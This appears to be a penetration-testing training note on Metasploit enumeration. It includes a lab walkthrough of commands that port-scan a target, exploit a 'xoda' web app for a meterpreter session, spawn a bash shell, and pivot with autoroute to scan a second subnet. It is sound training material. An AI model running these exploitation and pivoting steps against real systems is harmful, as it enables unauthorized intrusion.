# iii - Enumeration

### **Auxiliary Modules**

* Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing.
* We can use auxiliary modules to perform both TCP & UDP port scanning as well as enumerating information from services like FTP, SSH, HTTP, etc.
* Auxiliary modules can be used during the information gathering phase of a penetration test as well as during the post exploitation phase.
* We can also use auxiliary modules to discover hosts and perform port scanning on a different network subnet after we have obtained initial access on a target system.

### **Lab Infrastructure**

* Our objective is to utilize auxiliary modules to discover open ports on our first target?
* The next step will involve exploiting the service running on the target in order to obtain a foothold.
* We will then utilize our foothold to access other systems on a different network subnet (pivoting).
* We will then utilize auxiliary modules to scan of open ports on the second target.

<figure><img src="../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

## **Practical Demonstration**

```bash
# systemctl start postgresql && msfconsole
db_status # check if postgresql db is running.
workspace -a port_scan # create a new workspace for this session.
search portscan # search for the portscan auxiliary module or you can use the "db_nmap".
use 5 # select the tcp portscan.
set RHOSTS $ip
set PORTS 1-10000 # ports range
run

# in this case we just have a cmd line access, so we cant use a browser to view the web server, but we can use "curl" utility instead.
curl <targetIP> #Download the webpage (if the host is hosting one).

# we discovered the web server is running "xoda"
msf5 > search xoda 
msf5 > use 0
options
set RHOSTS $ip
set TARGETURI / # setting the URI to the root.
exploit # we get a meterpreter session.
sysinfo

# Now we want to scan the 2nd victim pc's ports, so we need to find out the private network ip addr (subnet) that the target victim pc is a part of.
shell # inorder to do that, we spawn a shell session.
/bin/bash -i # get a bash shell.
ifconfig # we saw another ip subnet on interface (eth1).
ctrl + z # exit the shell session, take note of the ip addr.

# back to our meterpreter session.
# we can add a route to the victim2 ip subnet from our meterpreter session.
# run autoroute -s 192.113.124.2 --> we just add a route to the target host PC.
msf5 > run autoroute -s <subnetTargetIP> #Route the traffic to the subnet's target IP address of the first target previously exploited

background # put the running session in background.
sessions # view current sessions.

# search portscan
use 5
set RHOSTS $ip_victim2 # because we already added a route to this network, we are simply performing the scan through "Victim1" PC.
run
# we can now scan other subnets on a network.

search udp-sweep # a module for udp scans.
use 0
set RHOSTS $ip_victim1 or $ip_victim2
```



